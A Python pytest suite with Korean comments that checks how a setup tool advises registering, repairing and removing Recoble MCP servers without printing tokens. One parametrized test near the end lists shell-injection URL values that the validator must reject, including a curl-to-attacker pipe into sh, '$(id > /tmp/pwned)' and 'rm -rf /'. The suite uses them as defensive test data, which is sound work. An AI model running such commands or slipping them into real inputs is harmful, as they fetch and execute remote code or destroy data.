"""Recoble MCP 로컬 스코프 등록 안내 — /vdev-init 의 `[Recoble MCP]` 단계.

vway-kit 은 저장소 `.mcp.json` 을 쓰지 않음. Recoble 서버는 사람이 자기 터미널에서
`claude mcp add` 로 **local 스코프**(`~/.claude.json` 의 프로젝트 경로 밑)에 넣고, 이
단계는 config 와 대조해 정상이면 건너뛰고 어긋나면 고칠 명령을 보여주기만 함 —
토큰은 읽지도 찍지도 않음(Invariant 6).

`test_setup.py` 에서 분리한 이유: 이 계약은 셋업 배선이 아니라 ALM 접속
경로라서, 한 파일에 섞이면 어느 쪽 규율이 깨졌는지 실패 이름만으로 못 가림.
"""

import json
from pathlib import Path

import pytest
import yaml as _yaml

from scripts.vdev_init_setup import (
    recoble_mcp_instructions,
    recoble_servers,
    report_legacy_mcp_json,
    report_recoble_mcp_servers,
    run_uninstall,
)
from tests.vdev_init._helpers import PLUGIN


def _write_alm_config(host: Path, alm: dict) -> None:
    cfg_dir = host / ".claude" / "vway-kit" / "config"
    cfg_dir.mkdir(parents=True, exist_ok=True)
    (cfg_dir / "vdev-config.yaml").write_text(
        _yaml.safe_dump({"alm": alm}, allow_unicode=True), encoding="utf-8"
    )


_TOKEN = "sk-live-DO-NOT-LEAK"


def _healthy(url: str) -> dict:
    return {"type": "http", "url": url, "headers": {"Authorization": f"Bearer {_TOKEN}"}}


def _write_registry(path: Path, host: Path, servers: dict, *, key: str | None = None) -> None:
    """~/.claude.json 흉내 — local 스코프 서버는 projects[<프로젝트 경로>] 밑에 삶."""
    path.write_text(
        json.dumps({"projects": {key or str(host): {"mcpServers": servers}}}),
        encoding="utf-8",
    )


_TWO_SPACES = {
    "provider": "recoble",
    "recoble": {
        "default": "labs",
        "spaces": {
            "labs": {"mcp_url": "https://mcp.recoble.com/s/aaa/mcp", "workboard": "kit"},
            "client-a": {"mcp_url": "https://mcp.recoble.com/s/bbb/mcp", "workboard": "ca"},
        },
    },
}


def test_recoble_mcp_instructions_emits_add_command_for_unregistered_space(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {})
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[+] recoble-labs" in text, text
    assert "claude mcp add -t http recoble-labs" in text, text
    assert "https://mcp.recoble.com/s/aaa/mcp" in text, text
    # 토큰은 자리표시자로만 등장 — /vdev-init 은 값을 묻지도 받지도 않음.
    assert "Authorization: Bearer <PAT>" in text, text


def test_recoble_mcp_instructions_skips_healthy_registration(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {"recoble-labs": _healthy("https://mcp.recoble.com/s/aaa/mcp")})
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[=] recoble-labs 정상 (skip)" in text, text
    assert "claude mcp add -t http recoble-labs" not in text, text
    # 나머지 스페이스는 여전히 안내됨 — 하나가 정상이라고 전부 건너뛰지 않음.
    assert "claude mcp add -t http recoble-client-a" in text, text


def test_recoble_mcp_instructions_flags_url_mismatch(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {"recoble-labs": _healthy("https://mcp.recoble.com/s/zzz/mcp")})
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[~] recoble-labs" in text and "url 불일치" in text, text
    # claude mcp add 는 같은 이름이 있으면 거절함(실측) — 고치려면 remove 가 먼저.
    assert "claude mcp remove recoble-labs" in text, text
    assert text.index("claude mcp remove recoble-labs") < text.index(
        "claude mcp add -t http recoble-labs"
    ), text


def test_recoble_mcp_instructions_flags_missing_authorization(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(
        reg,
        tmp_path,
        {"recoble-labs": {"type": "http", "url": "https://mcp.recoble.com/s/aaa/mcp"}},
    )
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[~] recoble-labs" in text and "Authorization" in text, text
    assert "claude mcp remove recoble-labs" in text, text


def test_recoble_mcp_instructions_flags_empty_bearer(tmp_path: Path):
    # "Bearer " 뒤가 비면 인증이 아님 — 값을 읽지 않고도 알 수 있는 유일한 결함.
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(
        reg,
        tmp_path,
        {
            "recoble-labs": {
                "type": "http",
                "url": "https://mcp.recoble.com/s/aaa/mcp",
                "headers": {"Authorization": "Bearer "},
            }
        },
    )
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[~] recoble-labs" in text and "Authorization" in text, text


def test_recoble_mcp_instructions_flags_wrong_transport_type(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    entry = _healthy("https://mcp.recoble.com/s/aaa/mcp")
    entry["type"] = "sse"
    _write_registry(reg, tmp_path, {"recoble-labs": entry})
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[~] recoble-labs" in text and "type 불일치" in text, text


def test_recoble_mcp_instructions_never_prints_the_token(tmp_path: Path):
    """정상이든 어긋났든 헤더 값은 출력에 실리면 안 됨 — Invariant 6."""
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(
        reg,
        tmp_path,
        {
            "recoble-labs": _healthy("https://mcp.recoble.com/s/aaa/mcp"),
            "recoble-client-a": _healthy("https://mcp.recoble.com/s/wrong/mcp"),
        },
    )
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert _TOKEN not in text, text


def test_recoble_mcp_instructions_failopen_on_unreadable_registry(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    reg.write_text("{ not json", encoding="utf-8")
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    # 판정을 못 하면 전부 안내 — 이미 등록된 사람은 already exists 로 거절될 뿐.
    assert "claude mcp add -t http recoble-labs" in text, text
    assert "claude mcp add -t http recoble-client-a" in text, text
    assert "확인할 수 없" in text, text


def test_recoble_mcp_instructions_failopen_when_registry_absent(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    text = "\n".join(recoble_mcp_instructions(tmp_path, tmp_path / "nope.json"))
    assert "claude mcp add -t http recoble-labs" in text, text


def test_recoble_mcp_instructions_matches_project_key_with_forward_slashes(tmp_path: Path):
    # 실제 ~/.claude.json 은 Windows 경로도 슬래시로 적는다(실측).
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(
        reg,
        tmp_path,
        {"recoble-labs": _healthy("https://mcp.recoble.com/s/aaa/mcp")},
        key=str(tmp_path).replace("\\", "/"),
    )
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[=] recoble-labs 정상 (skip)" in text, text


def test_recoble_mcp_instructions_ignores_other_projects(tmp_path: Path):
    # 다른 프로젝트에 등록된 같은 이름을 이 저장소 것으로 오인하면, 사람은 등록했다고
    # 믿는데 이 저장소에서는 서버가 없음.
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(
        reg,
        tmp_path,
        {"recoble-labs": _healthy("https://mcp.recoble.com/s/aaa/mcp")},
        key=str(tmp_path / "somewhere-else"),
    )
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[+] recoble-labs" in text, text


def test_recoble_mcp_instructions_never_writes(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {})
    before = reg.read_text(encoding="utf-8")
    recoble_mcp_instructions(tmp_path, reg)
    assert reg.read_text(encoding="utf-8") == before
    # 저장소 .mcp.json 은 vway-kit 의 소관이 아님.
    assert not (tmp_path / ".mcp.json").exists()


def test_recoble_mcp_instructions_rejects_bad_slug(tmp_path: Path):
    _write_alm_config(
        tmp_path,
        {"recoble": {"spaces": {"VWAY Labs": {"mcp_url": "https://mcp.recoble.com/s/aaa/mcp"}}}},
    )
    lines = recoble_mcp_instructions(tmp_path, tmp_path / "claude.json")
    assert any("[a-z0-9-]" in ln for ln in lines), lines
    assert not any("claude mcp add" in ln for ln in lines), lines


def test_recoble_mcp_instructions_skips_space_without_url(tmp_path: Path):
    _write_alm_config(tmp_path, {"recoble": {"spaces": {"labs": {"workboard": "kit"}}}})
    lines = recoble_mcp_instructions(tmp_path, tmp_path / "claude.json")
    assert any("mcp_url" in ln for ln in lines), lines
    assert not any("claude mcp add" in ln for ln in lines), lines


def test_recoble_mcp_instructions_noop_without_alm_config(tmp_path: Path):
    lines = recoble_mcp_instructions(tmp_path, tmp_path / "claude.json")
    assert lines == ["  [=] Recoble 스페이스 없음 (skip)"]


def test_recoble_mcp_instructions_states_the_local_scope(tmp_path: Path):
    # local 스코프는 cwd 경로 키 — worktree 마다 다시 등록해야 한다는 사실을 말하지
    # 않으면 사람은 등록해 둔 서버가 왜 안 보이는지 모름.
    _write_alm_config(tmp_path, _TWO_SPACES)
    text = "\n".join(recoble_mcp_instructions(tmp_path, tmp_path / "claude.json"))
    assert "worktree" in text, text


def test_example_config_ships_a_recoble_default_alm_block(tmp_path: Path):
    """example 이 곧 새 호스트의 출발점 — 스키마가 여기서 어긋나면 /vdev-init 이
    내는 등록 안내도 같이 어긋남."""
    ex = _yaml.safe_load((PLUGIN / "vdev-config.example.yaml").read_text(encoding="utf-8"))
    assert "teamer" not in ex, "최상위 teamer 는 alm.teamer 로 이동했다"
    alm = ex["alm"]
    assert alm["provider"] == "recoble" and alm["auto"] is True
    assert set(alm["teamer"]) == {"project_no", "workitem_no", "workflow_no"}
    default = alm["recoble"]["default"]
    assert default in alm["recoble"]["spaces"], "default 는 실재하는 스페이스여야 한다"

    cfg_dir = tmp_path / ".claude" / "vway-kit" / "config"
    cfg_dir.mkdir(parents=True)
    (cfg_dir / "vdev-config.yaml").write_text(
        _yaml.safe_dump(ex, allow_unicode=True), encoding="utf-8"
    )
    # example 의 mcp_url 은 자리표시자 UUID. 그대로 안내하면 사람이 닿지 않는 스페이스를
    # 등록하고, ALM 은 fail-open 이라 아무도 통보받지 않음.
    lines = recoble_mcp_instructions(tmp_path, tmp_path / "claude.json")
    assert all("자리표시자" in ln for ln in lines), lines
    assert any(f"'{default}'" in ln for ln in lines), lines


def test_example_recoble_spaces_reach_the_instructions_end_to_end(tmp_path: Path):
    """example↔안내 왕복을 실제 example 로 검증하는 유일한 테스트 — 나머지 alm/recoble
    테스트는 전부 손으로 쓴 fixture(_TWO_SPACES 등)라 vdev-config.example.yaml 의
    alm.recoble.spaces 모양이 바뀌어 안내가 깨져도 이 테스트가 없으면 아무 데도 걸리지
    않음. mcp_url 만 자리표시자가 아닌 실사용 가능한 값으로 바꾸고(자리표시자 그대로면
    recoble_servers 가드가 걸러 안내를 건너뜀), 그 외 구조는 손대지 않음.
    """
    ex = _yaml.safe_load((PLUGIN / "vdev-config.example.yaml").read_text(encoding="utf-8"))
    spaces = ex["alm"]["recoble"]["spaces"]
    assert spaces, "example 에 alm.recoble.spaces 가 비어 있음"

    substituted: dict[str, str] = {}
    for i, key in enumerate(spaces):
        val = spaces[key]
        assert isinstance(val, dict) and "mcp_url" in val, (
            f"example 스페이스 '{key}' 에 mcp_url 필드가 없음 — alm.recoble.spaces 스키마 확인"
        )
        url = f"https://mcp.recoble.com/s/e711598d-de19-4f35-b503-cf67205652{i:02x}/mcp"
        val["mcp_url"] = url
        substituted[key] = url

    _write_alm_config(tmp_path, ex["alm"])
    text = "\n".join(recoble_mcp_instructions(tmp_path, tmp_path / "claude.json"))

    for key, url in substituted.items():
        assert f"claude mcp add -t http recoble-{key}" in text, (
            f"example 스페이스 '{key}' 가 등록 안내에 나오지 않음"
            f" — alm.recoble.spaces 스키마가 recoble_servers 기대와 어긋난 듯"
        )
        assert url in text, f"example 스페이스 '{key}' 의 mcp_url 이 안내에 없음"

    default = ex["alm"]["recoble"]["default"]
    assert default in spaces, "default 는 실재하는 스페이스여야 한다"
    assert f"recoble-{default}" in text, f"default 스페이스 '{default}' 가 안내되지 않음"


# ── 자리표시자 mcp_url 거부 (슬롯 백필이 example 값을 들여왔을 때의 두 번째 그물) ─────


def test_recoble_servers_skips_placeholder_uuid(tmp_path: Path):
    servers, warnings = recoble_servers(
        {
            "recoble": {
                "spaces": {
                    "labs": {
                        "mcp_url": "https://mcp.recoble.com/s/00000000-0000-0000-0000-000000000000/mcp"
                    },
                    "client-a": {
                        "mcp_url": "https://mcp.recoble.com/s/11111111-1111-1111-1111-111111111111/mcp"
                    },
                    "real": {
                        "mcp_url": "https://mcp.recoble.com/s/e711598d-1c2b-4f3a-90de-77a1b2c3d4e5/mcp"
                    },
                }
            }
        }
    )
    # 자리표시자 둘만 걸러지고 진짜 UUID 는 통과함(검사가 좁아 오탐이 없음).
    assert set(servers) == {"recoble-real"}
    assert len(warnings) == 2
    assert all("자리표시자" in ln for ln in warnings), warnings


def test_recoble_servers_keeps_real_uuid_with_repeated_digits(tmp_path: Path):
    # 반복 자리가 섞였을 뿐 한 자리 반복이 아닌 UUID 는 실제 URL — 막으면 안 됨.
    servers, warnings = recoble_servers(
        {
            "recoble": {
                "spaces": {
                    "labs": {
                        "mcp_url": "https://mcp.recoble.com/s/11111111-2222-3333-4444-555555555555/mcp"
                    }
                }
            }
        }
    )
    assert set(servers) == {"recoble-labs"} and warnings == []


def test_recoble_mcp_instructions_reports_placeholder_without_a_command(tmp_path: Path):
    _write_alm_config(
        tmp_path,
        {
            "recoble": {
                "spaces": {
                    "labs": {
                        "mcp_url": "https://mcp.recoble.com/s/00000000-0000-0000-0000-000000000000/mcp"
                    }
                }
            }
        },
    )
    lines = recoble_mcp_instructions(tmp_path, tmp_path / "claude.json")
    assert any("자리표시자" in ln and "[!]" in ln for ln in lines), lines
    assert not any("claude mcp add" in ln for ln in lines), lines


# ── uninstall 보고 — 등록된 local 스코프 서버는 사람이 직접 지움 ────────────────────


def test_report_recoble_mcp_servers_guides_manual_removal(tmp_path: Path):
    reg = tmp_path / "claude.json"
    _write_registry(
        reg,
        tmp_path,
        {
            "recoble-labs": _healthy("https://mcp.recoble.com/s/aaa/mcp"),
            "sentry": {"type": "http", "url": "https://x/mcp"},
        },
    )
    lines = report_recoble_mcp_servers(tmp_path, reg)
    text = "\n".join(lines)
    assert "claude mcp remove recoble-labs" in text, text
    # 남의 서버는 언급조차 하지 않음 — 지우라고 할 근거가 없음.
    assert "sentry" not in text, text
    assert _TOKEN not in text, text


def test_report_recoble_mcp_servers_reports_none(tmp_path: Path):
    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {"sentry": {"type": "http", "url": "https://x/mcp"}})
    lines = report_recoble_mcp_servers(tmp_path, reg)
    assert lines == ["  [=] 등록된 recoble 서버 없음 (skip)"]


def test_report_recoble_mcp_servers_says_when_it_cannot_tell(tmp_path: Path):
    # "없음" 이라고 단정하면 안 읽히는 사람은 살아 있는 PAT 가 등록된 채 남는 걸 통보받지
    # 못함 — 안내 경로가 같은 상황을 고지하므로 두 입구의 답이 어긋나서도 안 됨.
    reg = tmp_path / "claude.json"
    reg.write_text("{ not json", encoding="utf-8")
    text = "\n".join(report_recoble_mcp_servers(tmp_path, reg))
    assert "확인할 수 없" in text, text
    assert "없음 (skip)" not in text, text


def test_run_uninstall_reports_recoble_servers(tmp_path: Path, capsys, monkeypatch):
    # run_uninstall 배선 자체의 유일한 커버리지 — local 스코프 등록은 삭제하지 않고
    # 사람이 지울 명령만 보여줌.
    import scripts.vdev_init_setup as mod

    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {"recoble-labs": _healthy("https://m/mcp")})
    monkeypatch.setattr(mod, "_claude_registry_path", lambda: reg)
    before = reg.read_text(encoding="utf-8")

    run_uninstall(tmp_path)

    captured = capsys.readouterr().out
    assert "[Recoble MCP]" in captured
    assert "claude mcp remove recoble-labs" in captured
    assert reg.read_text(encoding="utf-8") == before


def test_recoble_mcp_instructions_flags_a_non_object_entry(tmp_path: Path):
    # 사람이 손으로 문자열을 박아 넣은 항목. 사유 문자열이 무검증이면 안내가 말이 안 되는
    # 문장을 내도 스위트는 조용함.
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    _write_registry(reg, tmp_path, {"recoble-labs": "https://mcp.recoble.com/s/aaa/mcp"})
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[~] recoble-labs" in text and "객체가 아님" in text, text
    assert "claude mcp remove recoble-labs" in text, text


def test_recoble_mcp_instructions_failopen_when_projects_key_absent(tmp_path: Path):
    # 갓 설치한 Claude Code 의 실제 모양. 판정 근거가 없으므로 전부 안내해야 함.
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    reg.write_text("{}", encoding="utf-8")
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "확인할 수 없" in text, text
    assert "claude mcp add -t http recoble-labs" in text, text


def test_recoble_mcp_instructions_failopen_on_non_object_projects(tmp_path: Path):
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    reg.write_text('{"projects": []}', encoding="utf-8")
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "확인할 수 없" in text, text


def test_recoble_mcp_instructions_reads_a_non_object_mcpservers_as_none_registered(
    tmp_path: Path,
):
    # 프로젝트 키는 있는데 mcpServers 가 객체가 아님 — 판정은 됐고 등록이 없는 것.
    # 판정 불가와 섞으면 "확인할 수 없" 이 나가고 사람은 없는 문제를 찾음.
    _write_alm_config(tmp_path, _TWO_SPACES)
    reg = tmp_path / "claude.json"
    reg.write_text(json.dumps({"projects": {str(tmp_path): {"mcpServers": []}}}), encoding="utf-8")
    text = "\n".join(recoble_mcp_instructions(tmp_path, reg))
    assert "[+] recoble-labs" in text, text
    assert "확인할 수 없" not in text, text


# ── 구버전이 저장소에 남긴 .mcp.json ───────────────────────────────────────────


def test_legacy_mcp_json_is_silent_when_there_is_nothing_to_say(tmp_path: Path):
    assert report_legacy_mcp_json(tmp_path) == []
    (tmp_path / ".mcp.json").write_text('{"mcpServers": {"other": {}}}', encoding="utf-8")
    assert report_legacy_mcp_json(tmp_path) == []


def test_legacy_mcp_json_names_the_servers_an_older_install_wrote(tmp_path: Path):
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"recoble-labs": {}, "recoble-a": {}, "other": {}}}),
        encoding="utf-8",
    )
    out = "\n".join(report_legacy_mcp_json(tmp_path))
    assert "recoble-labs" in out and "recoble-a" in out
    assert "other" not in out


def test_legacy_mcp_json_does_not_read_an_unreadable_file_as_empty(tmp_path: Path):
    """읽기 실패를 '없음' 으로 접으면 남은 등록을 아무도 통보받지 못함."""
    (tmp_path / ".mcp.json").write_text("{broken", encoding="utf-8")
    assert any("읽을 수 없" in line for line in report_legacy_mcp_json(tmp_path))


@pytest.mark.parametrize(
    "body", ['{"mcpServers": 5}', '{"mcpServers": true}', '{"mcpServers": "recoble-a"}', "[]"]
)
def test_a_poisoned_mcp_json_does_not_kill_the_run(tmp_path: Path, body: str):
    """오염된 JSON 하나가 두 입구를 통째로 죽이면 안 됨 — 예외는 `_step` 을 지나감.

    uninstall 은 게이트만 푼 반쪽 상태로 멈추고, setup 은 판정 줄에 닿지 못함(Invariant 1).
    """
    (tmp_path / ".mcp.json").write_text(body, encoding="utf-8")
    assert report_legacy_mcp_json(tmp_path) == []


def test_uninstall_does_not_claim_nothing_while_mcp_json_still_has_entries(
    tmp_path: Path, capsys, monkeypatch
):
    """구버전 설치자에게 uninstall 이 거짓을 찍던 자리 — 두 입구가 같은 답을 내야 함."""
    import scripts.vdev_init_setup as mod

    monkeypatch.setattr(mod, "_claude_registry_path", lambda: tmp_path / "absent.json")
    (tmp_path / ".mcp.json").write_text(
        json.dumps({"mcpServers": {"recoble-labs": {}}}), encoding="utf-8"
    )
    run_uninstall(tmp_path)
    assert "recoble-labs" in capsys.readouterr().out


# ── mcp_url 은 붙여넣기용 명령 텍스트로 나감 ──────────────────────────────────


@pytest.mark.parametrize(
    "url",
    [
        'https://mcp.recoble.com/s/aaa/mcp" ; curl http://attacker/x | sh # ',
        "$(id > /tmp/pwned)",
        "https://mcp.recoble.com/s/aaa/mcp && rm -rf /",
        "https://mcp.recoble.com/s/aaa/mcp\nrm -rf /",
        "https://mcp.recoble.com/s/`id`/mcp",
        "http://mcp.recoble.com/s/aaa/mcp",  # https 아님
    ],
)
def test_a_shell_significant_mcp_url_never_reaches_the_command(url: str):
    """이 값은 사람이 자기 터미널에 붙여넣는 명령에 실림 — 셸이 뜻을 갖는 글자는 못 들어감.

    출처가 팀 공유·git 추적 파일(vdev-config.yaml)이라, 그 파일 쓰기 권한이 명령 실행 권한이
    되면 안 됨. 거르되 조용히 죽지 않고 사유를 말함(FAIL-OPEN — 나머지 스페이스는 렌더).
    """
    servers, warnings = recoble_servers({"recoble": {"spaces": {"labs": {"mcp_url": url}}}})
    assert servers == {}
    assert any("모양이 아닙니다" in w for w in warnings)


def test_a_normal_recoble_url_still_renders():
    url = "https://mcp.recoble.com/s/3f2b1c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d/mcp"
    servers, warnings = recoble_servers({"recoble": {"spaces": {"labs": {"mcp_url": url}}}})
    assert servers == {"recoble-labs": {"type": "http", "url": url}}
    assert warnings == []
